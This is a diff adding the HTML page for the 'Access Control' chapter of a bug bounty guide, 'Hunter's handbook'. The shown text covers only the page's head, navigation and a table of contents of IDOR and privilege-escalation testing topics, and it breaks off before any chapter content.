@@ -1,0 +1,2112 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="The single most common high-severity vulnerability class in bug bounty. Cannot be found by a scanner. Requires a human who understands what the app is supposed to restrict — and then tests whether it actually does.">
+      
+      
+        <meta name="author" content="Wellington Vumu">
+      
+      
+      
+        <link rel="prev" href="../part-02-authentication/">
+      
+      
+        <link rel="next" href="../part-04-injection/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.39">
+    
+    
+      
+        <title>Access Control - Hunter's handbook</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#access-control" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-header__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hunter's handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Access Control
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-nav__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Hunter's handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="./.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-rocket" viewBox="0 0 24 24"><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09"/><path d="M9 12a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.4 22.4 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 .05 5 .05"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-01-recon/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-02-authentication/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31-idor-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1 IDOR Fundamentals
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.1 IDOR Fundamentals">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#311-object-reference-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.1 Object Reference Types
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#312-where-idors-live" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.2 Where IDORs Live
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#313-the-two-account-testing-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.3 The Two-Account Testing Methodology
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#314-uuid-and-hash-based-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.4 UUID and Hash-Based IDOR
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#32-finding-idors-at-scale" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.2 Finding IDORs at Scale
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.2 Finding IDORs at Scale">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#321-manual-flow-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.2.1 Manual Flow Mapping
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#322-chaining-idors-into-account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.2.2 Chaining IDORs into Account Takeover
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#33-vertical-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3 Vertical Privilege Escalation
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.3 Vertical Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#331-role-parameter-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3.1 Role Parameter Tampering
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#332-admin-endpoint-access-as-regular-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3.2 Admin Endpoint Access as Regular User
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#333-forced-browsing-and-state-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3.3 Forced Browsing and State Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#34-indirect-object-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.4 Indirect Object References
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.4 Indirect Object References">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#341-email-and-username-as-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.4.1 Email and Username as References
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#342-filename-as-reference-path-traversal-variant" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.4.2 Filename as Reference (Path Traversal Variant)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#35-idor-impact-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.5 IDOR Impact Escalation
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.5 IDOR Impact Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#351-severity-framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.5.1 Severity Framework
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#352-writing-the-idor-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.5.2 Writing the IDOR Report
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-3-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 3 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-04-injection/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-05-ssrf-xxe/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-06-business-logic/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-07-api/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cog" viewBox="0 0 24 24"><path d="M11 10.27 7 3.34M11 13.73l-4 6.93M12 22v-2M12 2v2M14 12h8M17 20.66l-1-1.73M17 3.34l-1 1.73M2 12h2M20.66 17l-1.73-1M20.66 7l-1.73 1M3.34 17l1.73-1M3.34 7l1.73 1"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="12" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    API Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-08-ai-llm/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain-circuit" viewBox="0 0 24 24"><path d="M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z"/><path d="M9 13a4.5 4.5 0 0 0 3-4M6.003 5.125A3 3 0 0 0 6.401 6.5M3.477 10.896a4 4 0 0 1 .585-.396M6 18a4 4 0 0 1-1.967-.516M12 13h4M12 18h6a2 2 0 0 1 2 2v1M12 8h8M16 8V5a2 2 0 0 1 2-2"/><circle cx="16" cy="13" r=".5"/><circle cx="18" cy="3" r=".5"/><circle cx="20" cy="21" r=".5"/><circle cx="20" cy="8" r=".5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AI & LLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-09-cloud/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-10-mobile/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-smartphone" viewBox="0 0 24 24"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-11-reporting/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-notebook-pen" viewBox="0 0 24 24"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4M2 10h4M2 14h4M2 18h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-12-platform/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-13-tooling/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-wrench" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-14-infrastructure/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server-cog" viewBox="0 0 24 24"><path d="m10.852 14.772-.383.923M13.148 14.772a3 3 0 1 0-2.296-5.544l-.383-.923M13.148 9.228l.383-.923"/><path d="m13.53 15.696-.382-.924a3 3 0 1 1-2.296-5.544M14.772 10.852l.923-.383M14.772 13.148l.923.383"/><path d="M4.5 10H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-.5M4.5 14H4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-4a2 2 0 0 0-2-2h-.5M6 18h.01M6 6h.01M9.228 10.852l-.923-.383M9.228 13.148l-.923.383"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendices/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-file-text" viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5M10 9H8M16 13H8M16 17H8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31-idor-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1 IDOR Fundamentals
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.1 IDOR Fundamentals">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#311-object-reference-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.1 Object Reference Types
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#312-where-idors-live" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.2 Where IDORs Live
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#313-the-two-account-testing-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.3 The Two-Account Testing Methodology
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#314-uuid-and-hash-based-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.1.4 UUID and Hash-Based IDOR
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#32-finding-idors-at-scale" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.2 Finding IDORs at Scale
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.2 Finding IDORs at Scale">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#321-manual-flow-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.2.1 Manual Flow Mapping
